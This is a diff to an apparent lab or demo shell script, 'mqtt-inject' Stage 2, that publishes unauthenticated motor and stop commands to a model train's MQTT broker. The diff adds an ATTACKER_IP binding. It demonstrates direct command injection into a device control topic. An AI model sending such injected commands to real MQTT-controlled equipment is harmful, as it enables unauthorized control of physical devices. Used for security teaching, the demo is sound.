@@ -5,13 +5,14 @@ set -euo pipefail
 
 BROKER="${BROKER:-mosquitto}"
 TRAIN="${TRAIN:-t1}"
+ATTACKER_IP="${ATTACKER_IP:-192.168.100.53}"
 
 echo "=== [mqtt-inject] Stage 2: Direct command injection ==="
 echo ""
 
 echo "--- Sending motor command: forward, power=99 ---"
 echo "  (controller will clamp to MAX_POWER=50, but wire shows 99)"
-mosquitto_pub -h "$BROKER" \
+mosquitto_pub -h "$BROKER" -A "$ATTACKER_IP" \
   -t "choochoo/train/${TRAIN}/cmd/motor" \
   -m '{"action":"motor","direction":"forward","power":99}'
 echo "  Sent. Watch the train UI at http://web-mqtt:8000"
@@ -29,7 +30,7 @@ echo ""
 sleep 2
 
 echo "--- Sending stop ---"
-mosquitto_pub -h "$BROKER" \
+mosquitto_pub -h "$BROKER" -A "$ATTACKER_IP" \
   -t "choochoo/train/${TRAIN}/cmd/stop" \
   -m '{}'
 echo "  Stopped."
